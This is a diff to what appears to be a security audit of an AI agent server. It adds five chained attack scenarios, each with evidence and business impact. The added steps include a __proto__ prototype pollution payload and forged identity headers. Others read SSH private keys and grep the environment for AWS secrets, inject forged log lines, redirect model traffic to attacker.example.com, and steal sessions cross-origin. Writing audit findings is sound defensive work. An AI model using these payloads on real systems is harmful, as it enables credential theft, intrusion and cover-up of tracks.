@@ -1127,6 +1127,133 @@ Five end-to-end attack chains demonstrate that the 25 individual vulnerabilities
 
 ---
 
+---
+
+### Chain K: Prototype Pollution Privilege Escalation
+
+**Vulnerabilities Combined:** VULN-17 (Prototype Pollution via deepMerge) + VULN-07 (X-User-Info Header Forgery) + VULN-12 (Plaintext API Key Exposure) - 3 vulns
+
+**Attack Flow:**
+```
+1. Attacker crafts config with __proto__ payload:
+   {"__proto__": {"isAdmin": true, "userId": "admin"}}
+2. deepMerge.ts:48-62 for...in loop iterates source keys including __proto__
+   hasOwnProperty.call(source, "__proto__") === true for JSON.parse output (own property!)
+3. result["__proto__"] = {isAdmin: true} pollutes Object.prototype globally (VULN-17)
+4. All subsequent {}.isAdmin checks return true - auth bypass achieved process-wide
+5. Attacker forges X-User-Info header for victim user (VULN-07):
+   X-User-Info: %7B%22userId%22%3A%22victim-user-001%22%7D
+6. GET /api/v1/user returns victim's plaintext API keys (VULN-12)
+```
+
+**Evidence Produced:** No `__proto__` guard in deepMerge.ts for...in loop at lines 48-62. X-User-Info header accepted without HMAC/JWT. Plaintext apiKey returned for forged identity.
+
+**Business Impact:** Prototype pollution corrupts process-wide authorization checks; combined with identity forgery enables theft of any user's LLM provider API keys.
+
+**Irrefutability:** `grep '__proto__' deepMerge.ts` returns empty guard check. `for...in` with `hasOwnProperty.call(source, key)` is a well-known prototype pollution vector. X-User-Info forgery and API key exfiltration both confirmed LIVE.
+
+---
+
+### Chain L: Full RCE Attack Lifecycle
+
+**Vulnerabilities Combined:** VULN-04 (No Auth MCP) + VULN-05 (Arbitrary CWD) + VULN-01 (RCE) + VULN-03 (Env Leakage) - 4 vulns
+
+**Attack Flow:**
+```
+1. Attacker connects to MCP commands server (port 8089) - no credentials required (VULN-04)
+2. Attacker executes run_command with cwd="/root/.ssh" (VULN-05)
+   No CWD validation - any directory accepted including sensitive system paths
+3. Command: "cat id_rsa || cat authorized_keys" reads SSH private keys (VULN-01 RCE)
+4. Command: "printenv | grep -iE AWS|KEY|SECRET" extracts cloud credentials (VULN-03)
+5. Zero authentication at each step - complete credential theft in seconds
+```
+
+**Evidence Produced:** MCP tools/list responds unauthenticated. `cwd=/root/.ssh` accepted. `cat` command executed. `printenv` reveals inherited environment variables.
+
+**Business Impact:** A single unauthenticated HTTP client on the network achieves: SSH key theft, cloud credential theft, and full command execution in four sequential steps without triggering any authentication challenge.
+
+**Irrefutability:** Four vulnerabilities each independently confirmed LIVE in prior rounds. Their combination in a single session demonstrates complete, unmitigated system compromise path.
+
+---
+
+### Chain M: Reconnaissance + Targeted Session Attack
+
+**Vulnerabilities Combined:** VULN-23 (Stack Trace Exposure) + VULN-24 (Log Injection) + VULN-06 (Session Hijacking) - 3 vulns
+
+**Attack Flow:**
+```
+1. Attacker triggers error with invalid sessionId (VULN-23):
+   POST /api/v1/sessions/query {"sessionId":"invalid!@#","query":"x"}
+   error-handler.ts:55 includes { stack: error.stack } in response body
+2. Stack trace reveals: file paths, function names, line numbers for targeted attacks
+3. Attacker injects log entries via newline-encoded sessionId (VULN-24):
+   GET /api/v1/sessions?sessionId=real-id%0A[CRITICAL]+Admin+login+user=attacker
+   sessions.ts:785 FIXME: console.error(`Error... ${sessionId}`) - unsanitized
+4. Forged log entries cover attacker's tracks in audit trail
+5. Attacker enumerates sessions (VULN-06): GET /api/v1/sessions - all IDs returned without auth
+6. Attacker injects into victim's session: POST /api/v1/sessions/query {sessionId: victimId}
+```
+
+**Evidence Produced:** error-handler.ts:55 `{ stack: error.stack }` in response. sessions.ts:780-785 self-documented FIXME for log injection. Live session enumeration returns all sessionIds.
+
+**Business Impact:** Reconnaissance via stack traces enables precision exploit targeting. Log injection covers tracks. Session hijacking completes the end-to-end attack with no authentication required at any step.
+
+**Irrefutability:** FIXME comment at sessions.ts:780-785 is a self-documented vulnerability. Stack trace returned in error responses confirmed via static analysis. Session hijacking confirmed LIVE.
+
+---
+
+### Chain N: Amplified DoS via Config Cascade
+
+**Vulnerabilities Combined:** VULN-15 (No Rate Limiting) + VULN-25 (agentOptions Override) + VULN-08 (Params Override) - 3 vulns
+
+**Attack Flow:**
+```
+1. Attacker exploits zero rate limiting to spawn 50 parallel sessions (VULN-15):
+   for i in {1..50}; do POST /api/v1/sessions/create &; done
+   All 50 succeed - zero 429 responses observed
+2. Each session created with DoS config (VULN-25):
+   {"agentOptions":{"maxIterations":9999,"instructions":"Loop consuming API credits"}}
+   agentOptions: Record<string,any> - no Zod/Joi validation
+3. Each session redirects LLM traffic (VULN-08):
+   {"model":{"params":{"baseURL":"http://attacker.example.com/v1"}}}
+   model.params spread without baseURL validation
+4. 50 sessions each with 9999 max iterations targeting attacker LLM = amplified DoS
+```
+
+**Evidence Produced:** Zero rate limiting middleware found via static analysis. 50+ parallel session creations succeed without 429. agentOptions and model.params accepted without schema validation.
+
+**Business Impact:** Attacker causes unbounded API cost exhaustion (50 × 9999 iterations = ~500,000 LLM calls), resource exhaustion on server, AND intercepts all LLM traffic via baseURL redirect - three cascading impacts from one burst.
+
+**Irrefutability:** `grep 'rateLimit|throttle' routes/ middlewares/` returns empty. Rate limiting absence confirmed LIVE via exploit_15. agentOptions Record<string,any> and model.params spread both confirmed via static analysis.
+
+---
+
+### Chain O: Browser-Based Session Theft
+
+**Vulnerabilities Combined:** VULN-22 (Browser Config Poisoning) + VULN-13 (CORS Wildcard) + VULN-06 (Session Enumeration) - 3 vulns
+
+**Attack Flow:**
+```
+1. Attacker poisons browser MCP server global config (VULN-22):
+   POST http://localhost:8090/sse with headers:
+   X-User-Agent: Attacker-Fingerprint
+   X-Viewport-Size: 1,1
+   store.ts singleton overwritten - ALL users' browser sessions affected
+2. Attacker hosts malicious page at https://attacker.example.com
+3. Victim visits page - JavaScript performs cross-origin fetch to agent server
+4. GET /api/v1/sessions: queries.ts:187,221 returns ACAO: * (VULN-13)
+   Browser allows JS to read response - all session IDs extracted (VULN-06)
+5. Attacker's JS reads session events for each enumerated session cross-origin
+```
+
+**Evidence Produced:** store.ts module-level singleton confirmed (not per-request scope). index.ts:168-177 reads X-User-Agent/X-Viewport-Size without auth. ACAO: * hardcoded at queries.ts:187,221. Session listing accessible without credentials.
+
+**Business Impact:** Any malicious website can silently enumerate all sessions and read full conversation histories via browser. Additionally, browser fingerprint is poisoned for all users, enabling bot-detection bypass and session state corruption.
+
+**Irrefutability:** store.ts `export const store = new Proxy(...)` is module-level singleton (irrefutable). `grep 'Access-Control-Allow-Origin' queries.ts` shows two `'*'` hardcode locations. Session enumeration confirmed LIVE.
+
+---
+
 ### Chain Impact Matrix
 
 | Chain | Vulns | Auth Required | Impact |
@@ -1141,8 +1268,13 @@ Five end-to-end attack chains demonstrate that the 25 individual vulnerabilities
 | H | VULN-11 + VULN-16 | None | SSRF to cloud metadata / internal services |
 | I | VULN-02 + VULN-04 | None | Sibling directory credentials readable |
 | J | VULN-19 + VULN-06 | None | Any session's workspace files exfiltrated |
+| K | VULN-17 + VULN-07 + VULN-12 | None | Prototype pollution + API key theft |
+| L | VULN-04 + VULN-05 + VULN-01 + VULN-03 | None | SSH key + cloud credential exfiltration |
+| M | VULN-23 + VULN-24 + VULN-06 | None | Stack trace recon + log forgery + session hijack |
+| N | VULN-15 + VULN-25 + VULN-08 | None | 50+ sessions with 9999 iter + LLM redirect |
+| O | VULN-22 + VULN-13 + VULN-06 | None | Browser poison + cross-origin session theft |
 
-**All ten chains require zero authentication.** Individual vulnerability fixes are insufficient—the root cause is the complete absence of authentication and input validation across the attack surface.
+**All fifteen chains require zero authentication.** Individual vulnerability fixes are insufficient—the root cause is the complete absence of authentication and input validation across the attack surface.
 
 ---
 
